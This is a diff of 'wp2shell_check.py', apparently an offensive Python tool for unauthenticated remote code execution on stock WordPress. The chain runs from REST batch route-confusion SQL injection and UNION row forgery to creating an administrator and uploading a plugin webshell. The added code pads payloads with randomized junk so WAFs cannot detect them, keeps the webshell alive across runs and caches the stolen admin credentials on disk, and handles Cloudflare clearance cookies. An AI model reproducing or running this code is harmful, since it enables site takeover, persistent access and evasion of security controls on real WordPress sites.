@@ -22,21 +22,21 @@ fallback on three independent axes so a single blocked path never yields a false
 
 Each strategy is tried until one *confirms*; only when all come up empty is a target reported
 negative. Override with `--method boolean|time` / `--delivery json|multipart` (`--multipart` is
-an alias) / `--slot users|posts-item`. Reads no data and changes nothing. `--proof` reads two
-harmless scalars (@@version, current_user()) as evidence — still read-only.
+an alias) / `--slot users|posts-item`. Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
+current_user()) as evidence — still read-only.
 
 **Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
 object cache, no plugins, no misconfigurations required. The chain:
-  0. Row-forgery preflight (in-band UNION echo) confirms the split_the_query bypass works on
-     THIS target BEFORE any write — a persistent object cache blocks the RCE, not the SQLi, and
-     the preflight names that so no orphan rows are left on a target the chain can't finish
-  1. In-band UNION extraction reads the table prefix / admin ID / cache IDs straight out of the
-     confused posts response (one request each; the blind SLEEP oracle is the automatic fallback)
+  1. Blind SQLi confirms vulnerability and extracts table prefix / admin ID
   2. UNION row forgery via per_page=-1 split_the_query bypass injects fake posts
   3. oEmbed cache seeding turns read-only SQLi into real DB writes
   4. Changeset elevation + re-entrant parse_request runs in admin context
   5. POST /wp/v2/users creates a new administrator
-  6. Login → plugin webshell upload → command execution → self-cleanup
+  6. Login → plugin webshell upload → command execution (reused across runs)
+
+The created admin and deployed webshell are cached per target (~/.wp2shell/state.json),
+so repeat `-c` runs skip the whole chain and issue a single request to the live shell.
+--fresh forces the full chain; --cleanup makes the shell delete itself and clears the cache.
 
 The stock-default RCE mechanism (oEmbed → changeset → re-entry) was researched by
 Mustafa Can İPEKÇİ (nukedx), building on the route confusion + SQLi discovered by
@@ -53,7 +53,10 @@ Usage
     python3 wp2shell_check.py http://target --method time    # force the SLEEP oracle
     python3 wp2shell_check.py http://target --delivery multipart  # force rest_route form on /
     python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
-    python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE
+    python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE (caches admin+shell)
+    python3 wp2shell_check.py http://target -c "whoami"      # reuses the cached shell (single request)
+    python3 wp2shell_check.py http://target -c "id" --multipart  # RCE batch over rest_route forms
+    python3 wp2shell_check.py http://target --cleanup        # remove the deployed shell + forget state
     python3 wp2shell_check.py -f hosts.txt --authorized --json
     python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)
 
@@ -70,10 +73,13 @@ Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
 import argparse
 import base64
 import concurrent.futures
+import gzip
 import hashlib
 import html as html_mod
+import http.client
 import io
 import json
+import os
 import re
 import secrets
 import ssl
@@ -86,10 +92,11 @@ import urllib.parse
 import urllib.request
 import uuid
 import zipfile
+import zlib
 from collections import Counter
 from http.cookiejar import CookieJar
 
-__version__ = "2.3.0"
+__version__ = "3.0.0"
 
 
 class _KeepPost(urllib.request.HTTPRedirectHandler):
@@ -109,11 +116,13 @@ class _KeepPost(urllib.request.HTTPRedirectHandler):
 
 class Target:
     def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto", delivery="auto",
-                 slot="auto"):
+                 slot="auto", headers=None, cookies="", bypass=False):
         self.base = base.rstrip("/")
         self.timeout = timeout
         self.sleep = float(sleep)
         self.route = route
+        # extra headers (list of (name, value)) added to every request via opener.addheaders
+        self.extra_headers = list(headers or [])
         # delivery: "auto" (probe JSON, fall back to multipart if JSON isn't processed),
         # "json" (POST body to /wp-json|rest_route batch), or "multipart" (rest_route form on /).
         self.delivery = delivery
@@ -124,25 +133,124 @@ class Target:
         # universal — it survives targets that hard-disable the users endpoint for unauth.
         self.slot = slot
         self._slot = "users" if slot == "auto" else slot
+        self.union = False       # when set, read_scalar/read_int extract via UNION reflection
         self._proxy = proxy
         self.batch = None        # resolved endpoint URL (canonical, post-redirect)
         self._mp_ep = None       # resolved multipart endpoint (root vs /index.php)
         self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
         self._normalized = False # whether the base host/scheme has been canonicalized
+        # -- bypass (request pumping technique) --
+        self.cookies = cookies   # CF clearance cookies string (cf_clearance=...; __cf_bm=...; ...)
+        self.bypass = bypass     # low-level http.client pump path (Chrome 149 headers)
         # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
         # common on test targets). Equivalent to `curl -k`.
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+        self._ssl_ctx = ctx      # reused by _lowlevel
         opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
         if proxy:
             opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
         else:
             opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
         self.opener = urllib.request.build_opener(*opener_handlers)
+        # Strip urllib's default Python-urllib User-Agent so the user controls
+        # UA entirely via -H. If no -H "User-Agent:" is passed, no UA is sent.
+        self.opener.addheaders = [(n, v) for n, v in self.opener.addheaders
+                                  if n.lower() != "user-agent"]
+        self.opener.addheaders += self.extra_headers
 
-    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
+    # ---- low-level http.client bypass request --------------------------------
+    # Uses putrequest/putheader for precise header control. Only sends what
+    # the user provides via -H + Cookie (--cookies) + Content-Type + Content-Length.
+    # No hardcoded UA or fingerprint headers.
+    @staticmethod
+    def _decode_resp(data, encoding):
+        """Decompress gzip / deflate response bodies."""
+        if encoding == "gzip":
+            try:
+                return gzip.decompress(data)
+            except Exception:
+                return data
+        if encoding == "deflate":
+            try:
+                return zlib.decompress(data)
+            except Exception:
+                return data
+        return data
+
+    def _lowlevel(self, url, data=None, headers=None, method=None, timeout=None):
+        """http.client request for bypass mode. Only sends what the user
+        provides via -H (extra_headers) + Cookie + Content-Type + Content-Length.
+        No hardcoded UA or fingerprint headers — the user supplies those.
+        Returns (status, elapsed, body_bytes, final_url) — same shape as _raw()."""
+        parsed = urllib.parse.urlparse(url)
+        use_tls = (parsed.scheme == "https")
+        host = parsed.hostname or "localhost"
+        port = parsed.port or (443 if use_tls else 80)
+        default_port = (443 if use_tls else 80)
+        hostport = ("%s:%d" % (host, port)) if port != default_port else host
+        path = parsed.path or "/"
+        if parsed.query:
+            path += "?" + parsed.query
+
+        tout = timeout or self.timeout
+        if use_tls:
+            if self._proxy:
+                pp = urllib.parse.urlparse(self._proxy if "://" in self._proxy
+                                           else "http://" + self._proxy)
+                conn = http.client.HTTPSConnection(
+                    pp.hostname, pp.port, context=self._ssl_ctx, timeout=tout)
+                conn.set_tunnel(hostport)
+            else:
+                conn = http.client.HTTPSConnection(
+                    hostport, context=self._ssl_ctx, timeout=tout)
+        else:
+            if self._proxy:
+                pp = urllib.parse.urlparse(self._proxy if "://" in self._proxy
+                                           else "http://" + self._proxy)
+                conn = http.client.HTTPConnection(pp.hostname, pp.port, timeout=tout)
+                path = url  # absolute URI for plain-HTTP proxy
+            else:
+                conn = http.client.HTTPConnection(hostport, timeout=tout)
+
+        verb = method or ("POST" if data else "GET")
+        conn.putrequest(verb, path, skip_host=True, skip_accept_encoding=True)
+        conn.putheader("Host", hostport)
+
+        # Cookie (if set via --cookies)
+        if self.cookies:
+            conn.putheader("Cookie", self.cookies)
+
+        # User-supplied -H headers (including User-Agent, Sec-Ch-Ua, etc.)
+        for name, value in self.extra_headers:
+            conn.putheader(name, value)
+
+        # Content-Type (from the caller's headers dict)
+        ct_value = None
+        if headers:
+            items = headers.items() if isinstance(headers, dict) else headers
+            for k, v in items:
+                if k.lower() == "content-type":
+                    ct_value = v
+                    break
+        if ct_value:
+            conn.putheader("Content-Type", ct_value)
+
+        # Content-Length + send
+        if data:
+            conn.putheader("Content-Length", str(len(data)))
+        conn.endheaders(data)
+
+        t0 = time.perf_counter()
+        try:
+            resp = conn.getresponse()
+            raw = resp.read()
+            elapsed = time.perf_counter() - t0
+            body = self._decode_resp(raw, resp.getheader("Content-Encoding", ""))
+            return resp.status, elapsed, body, url
+        finally:
+            conn.close()
 
     def _normalize_base(self):
         """Follow redirects on the root once and pin the canonical scheme://host, so the
@@ -153,7 +261,7 @@ class Target:
             return
         self._normalized = True
         try:
-            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
+            req = urllib.request.Request(self.base + "/", headers={})
             with self.opener.open(req, timeout=self.timeout) as r:
                 u = urllib.parse.urlparse(r.geturl())
                 if u.scheme and u.netloc:
@@ -166,8 +274,12 @@ class Target:
 
     # -- HTTP ---------------------------------------------------------------
     def _raw(self, url, data=None, headers=None, method=None):
+        # When bypass is active (cookies set or --bypass flag), use the low-level
+        # http.client path for precise header ordering + double-CT support.
+        if self.cookies or self.bypass:
+            return self._lowlevel(url, data=data, headers=headers, method=method)
         hdrs = dict(headers or {})
-        hdrs.setdefault("User-Agent", self.UA)
+
         req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
         t0 = time.perf_counter()
         try:
@@ -216,6 +328,101 @@ class Target:
             {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
         ]}
 
+    # -- JSON junk padding (request pumping technique) ------------
+    # Wrap the batch envelope in a JSON dict with ~1MB of leading junk keys
+    # and trailing junk so the WAF's bounded body inspection window never
+    # reaches the real `requests` array. The structure mirrors final.json:
+    #   0_frontpad (1MB), 400+ mixed-pattern junk keys (some 0_<lc><digit>,
+    #   some pure-random 512-char keys, some nested dicts), then rest_route /
+    #   validation / requests / padding / _junk0 / _junk1 (nested dict), then
+    #   more trailing junk keys. Everything is randomized per-request so
+    #   there's no fixed signature the WAF can pin.
+    _FRONTPAD_LEN = 1_000_000      # base leading junk string length (jittered per-request)
+    _JUNK_KEY_COUNT = 400           # leading junk keys before the real data
+    _TRAILING_JUNK = 10             # trailing junk keys after the data
+    _PADDING_LEN = 65_536          # base trailing padding length (jittered)
+
+    _ALNUM = __import__("string").ascii_letters + __import__("string").digits
+
+    @staticmethod
+    def _rand_junk(n):
+        """Random alphanumeric string of length n (a-zA-Z0-9)."""
+        return "".join(secrets.choice(Target._ALNUM) for _ in range(n))
+
+    @staticmethod
+    def _rand_lc(n):
+        """Random lowercase string of length n."""
+        return "".join(secrets.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(n))
+
+    @staticmethod
+    def _rand_key_name():
+        """Random junk key name — varies the pattern to avoid signature detection."""
+        style = secrets.choice(["0_lc", "pure_long", "bare_word", "short_mixed"])
+        if style == "0_lc":
+            return "0_" + Target._rand_lc(8) + str(secrets.choice(range(10)))
+        elif style == "pure_long":
+            return Target._rand_junk(secrets.choice([48, 56, 64]))
+        elif style == "bare_word":
+            return Target._rand_lc(secrets.choice(range(8, 17)))
+        else:
+            return Target._rand_junk(secrets.choice(range(8, 17)))
+
+    @staticmethod
+    def _rand_nested_junk(depth=2):
+        """A small nested dict of random junk (mirrors final.json's 0_nest / _junk1)."""
+        out = {}
+        for _ in range(secrets.choice([3, 5, 8])):
+            if depth > 0 and secrets.choice([False, True]):
+                out[Target._rand_key_name()] = Target._rand_nested_junk(depth - 1)
+            else:
+                out[Target._rand_key_name()] = Target._rand_junk(secrets.choice([64, 128, 256]))
+        return out
+
+    def _pump_envelope(self, envelope):
+        """Wrap <envelope> in a junk-padded JSON structure (request pumping technique).
+
+        Every key name and every value is randomized per-request so there is no
+        fixed signature the WAF can pin. The real batch (rest_route + validation
+        + requests) is buried deep inside a ~2MB dict. The leading 1MB frontpad
+        + 400 mixed-pattern junk keys push past the WAF's body inspection window;
+        trailing padding + nested junk + more junk keys pad the tail.
+
+        The real `rest_route` / `validation` / `requests` keys are the only ones
+        with fixed names — WordPress needs them to route the batch. Everything
+        else gets a random name.
+        """
+        out = {}
+        # 1. Leading ~1MB frontpad (random key name, jittered length)
+        fpad = self._FRONTPAD_LEN + secrets.choice(range(-8192, 8193))
+        out[self._rand_key_name()] = self._rand_junk(fpad)
+        # 2. Hundreds of junk keys with random names, random lengths, some
+        #    pure-random 512-char values, some nested dicts.
+        for _ in range(self._JUNK_KEY_COUNT):
+            key = self._rand_key_name()
+            if secrets.choice([False, False, True]):  # ~1/3 are nested dicts
+                out[key] = self._rand_nested_junk()
+            elif secrets.choice([False, False, True]):  # ~1/3 are 512-char pure-random
+                out[key] = self._rand_junk(512)
+            else:                                   # ~1/3 are 256/1024/4096
+                out[key] = self._rand_junk(secrets.choice([256, 1024, 4096]))
+        # 3. A nested junk dict (random key name)
+        out[self._rand_key_name()] = self._rand_nested_junk()
+        # 4. A big junk string (random key name, ~20KB)
+        out[self._rand_key_name()] = self._rand_junk(20000)
+        # 5. The real batch data — only these keys have fixed names (WP needs them)
+        out["rest_route"] = "/batch/v1?" + self._rand_junk(200)
+        out["validation"] = "normal"
+        out["requests"] = envelope["requests"]
+        # 6. Trailing junk — all random key names, jittered lengths
+        padlen = self._PADDING_LEN + secrets.choice(range(-4096, 4097))
+        out[self._rand_key_name()] = self._rand_junk(padlen)
+        out[self._rand_key_name()] = self._rand_junk(32768 + secrets.choice(range(-2048, 2049)))
+        out[self._rand_key_name()] = {self._rand_key_name(): self._rand_junk(4000)
+                                      for _ in range(12)}
+        for _ in range(self._TRAILING_JUNK):
+            out[self._rand_key_name()] = self._rand_junk(4096)
+        return out
+
     # -- multipart (rest_route form) delivery -------------------------------
     # WordPress reads the public query var `rest_route` from $_POST in WP::parse_request(),
     # so the whole nested batch can ride as multipart form fields on POST / — no JSON, no
@@ -252,6 +459,32 @@ class Target:
         out.append(("--%s--\r\n" % boundary).encode())
         return "multipart/form-data; boundary=%s" % boundary, b"".join(out)
 
+    # -- multipart junk padding (--bypass + --multipart) --------------------
+    # Same idea as _pump_envelope but for multipart/form-data: prepend
+    # hundreds of random junk form fields (1MB+ of leading junk) so the WAF's
+    # bounded body inspection never reaches the real rest_route / validation /
+    # requests[*] fields. Mirrors final.json's structure but as flattened form
+    # fields instead of JSON keys.
+    _MP_FRONTPAD_FIELDS = 300       # leading junk fields
+    _MP_FRONTPAD_LEN = 4096         # each leading junk field value length
+    _MP_TRAILING_FIELDS = 10        # trailing junk fields after the real data
+    _MP_TRAILING_LEN = 4096
+
+    def _pump_multipart_fields(self, real_fields):
+        """Prepend + append random junk form fields around <real_fields> so
+        the WAF never inspects the real rest_route / requests[*] fields.
+        Returns a flat list of (name, value) pairs ready for _multipart_encode."""
+        fields = []
+        # 1. Leading junk fields — random names, 4KB random values each (~1.2MB)
+        for _ in range(self._MP_FRONTPAD_FIELDS):
+            fields.append((self._rand_key_name(), self._rand_junk(self._MP_FRONTPAD_LEN)))
+        # 2. The real fields (rest_route, validation, requests[*], ...)
+        fields.extend(real_fields)
+        # 3. Trailing junk fields
+        for _ in range(self._MP_TRAILING_FIELDS):
+            fields.append((self._rand_key_name(), self._rand_junk(self._MP_TRAILING_LEN)))
+        return fields
+
     def _send(self, author_exclude):
         """Deliver one injection carrying <author_exclude> into author__not_in.
         Returns (status, elapsed, body_bytes). Honors self.multipart."""
@@ -260,6 +493,8 @@ class Target:
         if self.multipart:
             fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
             fields += self._flatten_fields(env)
+            if self.bypass:
+                fields = self._pump_multipart_fields(fields)
             ctype, body = self._multipart_encode(fields)
             hdrs = {"Content-Type": ctype}
             if self._mp_ep is None:
@@ -272,6 +507,16 @@ class Target:
             st, el, resp, _ = self._raw(self._mp_ep, data=body, headers=hdrs, method="POST")
             return st, el, resp
         # JSON delivery (default)
+        if self.bypass:
+            # request pumping technique: wrap the batch in a ~2.7MB junk-padded
+            # JSON body and POST to /?rest_route=/batch/v1 so WP routes it via
+            # the query var while the WAF never inspects the real requests.
+            pumped = self._pump_envelope(env)
+            body = json.dumps(pumped).encode()
+            headers = {"Content-Type": "application/json"}
+            ep = self.base + "/?rest_route=/batch/v1"
+            st, el, resp, _ = self._raw(ep, data=body, headers=headers, method="POST")
+            return st, el, resp
         body = json.dumps(env).encode()
         headers = {"Content-Type": "application/json"}
         if self.batch is None:
@@ -292,9 +537,30 @@ class Target:
         st, el, _ = self._send(author_exclude)
         return st, el
 
-    @staticmethod
-    def _sleep_payload(seconds):
-        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds
+    # WAF bypass: prepend a long junk integer as the leading IN() operand, right before
+    # the injection breakout — the observed shape is `<junk> AND sleep(n)`. The digits
+    # ride ahead of the SQL keywords, so signature/keyword scanners that only inspect a
+    # bounded prefix of the value never reach the SLEEP/OR. Alternating 1/0 blocks keep
+    # it a plain numeric literal that survives charset normalization.
+    # NOTE: MySQL caps a bare numeric literal at 65 significant digits (DECIMAL); a pad
+    # this long only slips past the WAF if the backend casts the oversize literal to
+    # DOUBLE (non-strict mode) instead of erroring. Tune _PAD_LEN for the target.
+    _PAD_LEN = 133333        # base junk-integer length
+    _PAD_JITTER = 4096       # per-request length varies by +/- up to this, so the pad
+                             # isn't a fixed-length signature the WAF can pin on.
+
+    @classmethod
+    def _pad(cls):
+        """A leading junk integer of jittered length (~_PAD_LEN +/- _PAD_JITTER)."""
+        n = cls._PAD_LEN
+        if cls._PAD_JITTER:
+            n += secrets.randbelow(2 * cls._PAD_JITTER + 1) - cls._PAD_JITTER
+        n = max(1, n)
+        return (("1" * 8 + "0" * 8) * (n // 16 + 1))[:n]
+
+    @classmethod
+    def _sleep_payload(cls, seconds):
+        return "%s) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % (cls._pad(), seconds)
 
     # -- detection ----------------------------------------------------------
     def detect(self, rounds=3):
@@ -312,9 +578,9 @@ class Target:
     # status/pagination clauses, so X-WP-Total climbs); false -> zero rows. A stable
     # true>0 / false==0 differential is the injection firing. Faster than timing and
     # immune to SLEEP being filtered or optimized away on managed hosts.
-    @staticmethod
-    def _bool_payload(truth):
-        return "0) AND 1=%d-- -" % (1 if truth else 12)
+    @classmethod
+    def _bool_payload(cls, truth):
+        return "%s) AND 1=%d-- -" % (cls._pad(), 1 if truth else 12)
 
     @staticmethod
     def _harvest(body):
@@ -422,18 +688,44 @@ class Target:
             return
         self._set_delivery("json")  # neither processed; timing/rows will read negative anyway
 
+    def _union_confirms(self):
+        """True if a random token reflects back through the UNION sink (sets self.union).
+        The token is fresh each call so there's no fixed probe string on the wire."""
+        tok = secrets.token_hex(4)
+        try:
+            ok = self._union_read("SELECT 0x%s" % tok.encode().hex()) == tok
+        except urllib.error.URLError:
+            ok = False
+        self.union = ok
+        return ok
+
     def detect_auto(self, method="auto", rounds=3):
         """Automatic detection with fallback across three axes:
-          oracle:   boolean (fast, no SLEEP)  ->  time (SLEEP differential)
+          method:   union (reflect data) -> boolean (row-count) -> time (SLEEP)
           delivery: json  ->  multipart (rest_route form), when json isn't processed
           slot:     users  ->  posts-item, when the users endpoint is disabled for unauth
         Tries each until one CONFIRMS; returns the confirming (method, delivery, slot). A genuine
-        failure of one strategy (error, delivery blocked, endpoint hardened, oracle gives no
-        signal) falls through to the next; only when every configured strategy comes up empty is
-        it negative. The proven users+json+boolean happy path fires on the first 2 requests."""
+        failure of one strategy falls through to the next; only when every configured strategy
+        comes up empty is it negative."""
         deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
         slots = ["users", "posts-item"] if self.slot == "auto" else [self.slot]
         boo_by_key = {}
+
+        # 0) union reflection first (auto or forced): one request, yields real data
+        if method in ("auto", "union"):
+            for slot in slots:
+                self._set_slot(slot)
+                for d in deliveries:
+                    self._set_delivery(d)
+                    if self._union_confirms():
+                        return {"vulnerable": True, "method": "union", "delivery": d,
+                                "slot": slot, "time": None}
+            self.union = False
+            if method == "union":
+                neg = deliveries[0] if deliveries else self._delivery_name()
+                self._set_delivery(neg)
+                return {"vulnerable": False, "method": "union", "delivery": neg,
+                        "slot": slots[0], "time": None}
 
         # 1) boolean oracle across slot x delivery (each is cheap: 2 requests)
         if method in ("auto", "boolean"):
@@ -474,11 +766,14 @@ class Target:
 
     # -- bounded read-only proof -------------------------------------------
     def _oracle(self, cond, unit=0.6):
-        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
+        payload = "%s) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (self._pad(), cond, unit)
         _, el = self.probe(payload)
         return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)
 
     def read_scalar(self, expr, maxlen=40, unit=0.6):
+        if self.union:
+            v = self._union_read(expr)
+            return v if v is not None else ""
         v = "COALESCE((%s),'')" % expr
         lo, hi = 0, maxlen
         while lo < hi:
@@ -500,6 +795,12 @@ class Target:
         return out
 
     def read_int(self, query, unit=0.6):
+        if self.union:
+            v = self._union_read(query)
+            try:
+                return int(v)
+            except (TypeError, ValueError):
+                return 0
         expr = "COALESCE((%s),0)" % query
         lo, hi = 0, 1
         while self._oracle("%s >= %d" % (expr, hi), unit):
@@ -512,6 +813,84 @@ class Target:
                 hi = mid - 1
         return lo
 
+    # -- UNION-based extraction (single request per value) -------------------
+    # A 23-column UNION forges one wp_posts row whose post_content carries the target
+    # expression; the route confusion delivers it past REST arg validation and per_page
+    # >=500 keeps WP_Query on the single-query path so the columns align and the posts
+    # controller serializes our row. We wrap the value in a random marker so it survives
+    # the_content filters (wpautop/wptexturize) and can be sliced back out of the response.
+    # Much faster than the blind boolean/time oracle: one HTTP round-trip per value.
+    def _union_row(self, content_expr, title_expr="0x78"):
+        """23-column wp_posts row with a raw SQL expression in post_content (col 5)."""
+        h = self._hex
+        return ",".join((
+            "1", "1",
+            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
+            content_expr, title_expr, "''",
+            h("publish"), h("closed"), h("closed"), "''",
+            h("x"), "''", "''",
+            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
+            "0", "''", "0",
+            h("post"), "''", "0",
+        ))
+
+    def _union_batch(self, query, timeout=60):
+        """Deliver a UNION injection via the route confusion, honoring delivery."""
+        inner = [
+            {"method": "GET", "path": self.PRIMER},
+            {"method": "GET", "path": "/wp/v2/widgets?" + urllib.parse.urlencode(
+                {"author_exclude": query, "per_page": 500, "page": 1,
+                 "orderby": "none", "context": "view"})},
+            {"method": "GET", "path": "/wp/v2/posts"},
+        ]
+        return self._send_envelope({"requests": [
+            {"method": "POST", "path": self.PRIMER},
+            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner}},
+            {"method": "POST", "path": "/batch/v1"},
+        ]}, timeout=timeout)
+
+    @staticmethod
+    def _walk_strings(obj):
+        """Yield every string value in a nested dict/list (batch response body)."""
+        if isinstance(obj, dict):
+            for v in obj.values():
+                yield from Target._walk_strings(v)
+        elif isinstance(obj, list):
+            for v in obj:
+                yield from Target._walk_strings(v)
+        elif isinstance(obj, str):
+            yield obj
+
+    def _union_read(self, expr):
+        """Extract one scalar via UNION reflection. Returns the string, or None if the
+        marker never came back (reflection blocked / not vulnerable)."""
+        self._normalize_base()
+        tok = secrets.token_hex(5)
+        mark = "0x" + tok.encode().hex()          # marker as a hex literal for SQL
+        content = "CONCAT(%s,IFNULL((%s),0x2d),%s)" % (mark, expr, mark)
+        # leading junk-integer pad (WAF signature bypass) as the IN() operand, like the
+        # blind oracle payloads -- keeps the injection consistent across all modes.
+        query = "%s) AND 1=0 UNION ALL SELECT %s-- -" % (self._pad(), self._union_row(content))
+        raw = self._union_batch(query)
+        pat = re.compile(re.escape(tok) + r"(.*?)" + re.escape(tok), re.S)
+        # Parse the batch JSON and walk it, so string escapes (\/ , \uXXXX) are decoded
+        # by the parser; fall back to a raw-text scan if the body isn't clean JSON.
+        try:
+            haystacks = self._walk_strings(json.loads(raw))
+        except ValueError:
+            haystacks = [raw.decode("utf-8", "replace")]
+        for s in haystacks:
+            m = pat.search(s)
+            if m:
+                inner = re.sub(r"<[^>]+>", "", m.group(1))  # strip wpautop wrapping...
+                return html_mod.unescape(inner).strip()      # ...then decode HTML entities
+        return None
+
+    def read_union(self, expr):
+        """Public single-request UNION read (returns '' if nothing reflected)."""
+        v = self._union_read(expr)
+        return v if v is not None else ""
+
     # -- RCE: row forgery + oEmbed → changeset → re-entry → admin creation ----
     # Chain researched by Mustafa Can İPEKÇİ (nukedx),
     # building on the route confusion + SQLi by Adam Kues (Assetnote).
@@ -519,22 +898,49 @@ class Target:
     PRIMER = "http://:"
     EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
 
-    def _rce_send(self, inner_requests, timeout=None):
-        payload = {"requests": [
-            {"method": "POST", "path": self.PRIMER},
-            {"method": "POST", "path": "/wp/v2/posts",
-             "body": {"requests": inner_requests}},
-            {"method": "POST", "path": "/batch/v1"},
-        ]}
-        ep = self.batch or self._endpoints()[0]
-        body = json.dumps(payload).encode()
-        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
+    def _send_envelope(self, envelope, timeout=None):
+        """POST a batch <envelope> honoring the selected delivery. Under multipart the
+        whole nested batch rides as a rest_route form on POST / (same shape _send uses),
+        so the RCE forge/extraction requests go over the wire identically to detection —
+        instead of always falling back to a JSON batch POST."""
+        if self.multipart:
+            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
+            fields += self._flatten_fields(envelope)
+            if self.bypass:
+                fields = self._pump_multipart_fields(fields)
+            ctype, body = self._multipart_encode(fields)
+            ep = self._mp_ep or (self.base + "/")
+            hdrs = {"Content-Type": ctype}
+        elif self.bypass:
+            # request pumping technique: junk-padded JSON body to /?rest_route=/batch/v1
+            pumped = self._pump_envelope(envelope)
+            body = json.dumps(pumped).encode()
+            ep = self.base + "/?rest_route=/batch/v1"
+            hdrs = {"Content-Type": "application/json"}
+        else:
+            ep = self.batch or self._endpoints()[0]
+            body = json.dumps(envelope).encode()
+            hdrs = {"Content-Type": "application/json"}
+        # When bypass is active, use http.client for precise header control
+        if self.cookies or self.bypass:
+            _, _, resp_body, _ = self._lowlevel(
+                ep, data=body, headers=hdrs, method="POST",
+                timeout=timeout or self.timeout)
+            return resp_body
         req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
         try:
             with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                 return resp.read()
         except urllib.error.HTTPError as e:
             return e.read()
+
+    def _rce_send(self, inner_requests, timeout=None):
+        return self._send_envelope({"requests": [
+            {"method": "POST", "path": self.PRIMER},
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner_requests}},
+            {"method": "POST", "path": "/batch/v1"},
+        ]}, timeout=timeout)
 
     @staticmethod
     def _hex(value):
@@ -563,7 +969,7 @@ class Target:
     READ_PER_PAGE = 100000
 
     def _forge(self, rows, extra_requests=(), per_page=-1):
-        query = ("1) AND 1=0 UNION ALL SELECT "
+        query = ("%s) AND 1=0 UNION ALL SELECT " % self._pad()
                  + " UNION ALL SELECT ".join(rows) + " -- -")
         return self._rce_send([
             {"method": "GET", "path": self.PRIMER},
@@ -575,14 +981,6 @@ class Target:
         ], timeout=60)
 
     # -- in-band UNION read -------------------------------------------------
-    # The forged rows are echoed straight back in the confused posts response, so a value
-    # can be read IN-BAND in a single request instead of one binary-search ladder per byte
-    # via the blind oracle (~50-100x fewer requests -> far less WAF/rate-limit exposure).
-    # Each expression is carried as CONCAT(<marker>, HEX(CAST(expr AS CHAR)), <marker>) in a
-    # forged post's title. The marker is drawn from non-hex letters [G-Z] so it can never
-    # collide with the [0-9A-F] value hex, and HEX-then-CAST survives the_title filtering
-    # (wptexturize etc.) losslessly. Returns a list aligned with <exprs>; an element is None
-    # when the value did not echo back (caller falls back to the blind oracle).
     def _read_row(self, post_id, title_sql):
         """A forged posts row whose post_title is a RAW SQL expression (not a hex literal),
         published/post so the REST posts controller serializes title.rendered."""
@@ -644,16 +1042,300 @@ class Target:
             pass
         return self.read_int(query)
 
-    def exploit(self, command):
-        """Full pre-auth RCE. Returns (username, password, command_output)."""
+    # -- reuse state: remember a created admin + deployed webshell -------------
+    # Repeated `-c` runs against the same target are expensive and noisy (they re-seed
+    # oEmbed caches, re-run the blind-SQLi extraction, re-create a user and re-upload a
+    # plugin). We persist the admin creds + webshell route/marker per target under
+    # ~/.wp2shell/state.json and reuse them, so subsequent commands are a single request
+    # to the already-deployed shell. --fresh ignores the cache; --cleanup tears it down.
+    STATE_DIR = os.path.expanduser("~/.wp2shell")
+    STATE_FILE = os.path.join(STATE_DIR, "state.json")
+
+    @classmethod
+    def _load_all_state(cls):
+        try:
+            with open(cls.STATE_FILE) as fh:
+                return json.load(fh)
+        except (OSError, ValueError):
+            return {}
+
+    def _load_state(self):
+        return self._load_all_state().get(self.base, {})
+
+    def _save_state(self, data):
+        allst = self._load_all_state()
+        allst[self.base] = data
+        try:
+            os.makedirs(self.STATE_DIR, exist_ok=True)
+            tmp = self.STATE_FILE + ".tmp"
+            with open(tmp, "w") as fh:
+                json.dump(allst, fh, indent=2)
+            os.replace(tmp, self.STATE_FILE)
+            os.chmod(self.STATE_FILE, 0o600)   # creds on disk -> owner-only
+        except OSError as e:
+            sys.stderr.write("[!] could not persist reuse state: %s\n" % e)
+
+    def _clear_state(self):
+        allst = self._load_all_state()
+        if allst.pop(self.base, None) is not None:
+            try:
+                tmp = self.STATE_FILE + ".tmp"
+                with open(tmp, "w") as fh:
+                    json.dump(allst, fh, indent=2)
+                os.replace(tmp, self.STATE_FILE)
+                os.chmod(self.STATE_FILE, 0o600)
+            except OSError:
+                pass
+
+    # Persistent REST webshell. Unlike a one-shot shell it does NOT unlink on every call,
+    # so the deployed plugin can be reused across commands; `rm=1` triggers self-cleanup.
+    # The plugin name and REST namespace are randomized per deploy (see _deploy_shell) so
+    # there is no fixed "wp2shell/v1" string on the wire for a signature to catch.
